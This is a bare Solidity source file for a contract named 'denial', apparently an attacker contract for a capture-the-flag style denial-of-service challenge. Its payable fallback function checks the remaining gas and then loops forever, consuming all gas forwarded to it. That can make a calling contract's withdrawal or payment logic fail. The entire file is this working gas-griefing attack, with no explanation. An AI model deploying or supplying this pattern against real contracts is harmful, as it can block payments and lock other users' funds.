// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract denial {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    fallback() payable external{
        require(gasleft() > 500000);
        while (true) {
        }
    }
}